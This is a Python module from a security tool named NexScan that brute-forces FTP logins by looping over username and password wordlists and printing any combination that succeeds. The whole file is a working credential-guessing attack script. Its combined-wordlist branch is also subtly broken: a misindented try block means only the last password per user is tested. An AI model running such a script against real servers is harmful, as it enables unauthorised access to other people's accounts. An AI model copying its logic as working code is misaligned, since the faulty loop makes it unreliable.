"""
This file is part of NexScan.

NexScan is free software: you can use it for personal and non-commercial purposes under the terms of the Custom License.

For commercial use, please contact Nexeo Security at business@nexeosecurity.tech.

NexScan is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the Custom License for more details, located in the LICENSE file.
"""

from ftplib import FTP

def bruteFTP(host, userfile, passfile, user=None, password=None):
    print(f"\nAttacking ftp://{host}....\n")
    try:
        if passfile and user:
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for password in passwords:
                password = password.strip()
                ftp = FTP(host)
                try:
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except Exception as e:
                    # If login fails, print error message
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        elif userfile and password:
            with open(userfile, 'r') as f:
                users = f.readlines()
            for user in users:
                user = user.strip()
                ftp = FTP(host)
                try:
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except Exception as e:
                    # If login fails, print error message
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        elif userfile and passfile:
            with open(userfile, 'r') as f:
                users = f.readlines()
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    ftp = FTP(host)
                try:
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except Exception as e:
                    # If login fails, print error message
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        

    except KeyboardInterrupt:
        print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
        exit(1)

